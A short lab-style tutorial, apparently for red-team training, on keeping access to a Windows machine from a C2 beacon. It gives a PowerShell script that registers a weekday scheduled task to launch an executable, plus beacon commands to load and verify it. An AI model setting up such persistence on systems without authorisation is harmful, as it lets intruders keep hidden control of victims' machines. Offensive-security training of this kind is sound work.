# Setting Persistence

1. With your new beacon lets set simple persistence using `scheduled task` 
2. On parrot lets create a `.ps1` for our persistence 
3. If you have sublime installed run , alternatively use vim
    ```
    subl scktask.ps1
    ```

    ```
    vim scktask.ps1
    ```
4. Paste the following and save your script
    ```powershell
    $outpath = "C:\window\public\downloads\test.exe"
    $action = New-ScheduledTaskAction -Execute $outpath
    $days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
    $trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 8am
    Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Persistence Test" -Description "We got persistence"
    ```
5. In your beacon run pslo
    ```powershell
    pslo 
    ```
6. You should get confirmation your script work 

7. Lets verify our persistence is working by running sharpps 
    ```powershell
    sharpps get-scheduledtask -Taskname "Persistence Test"
    ```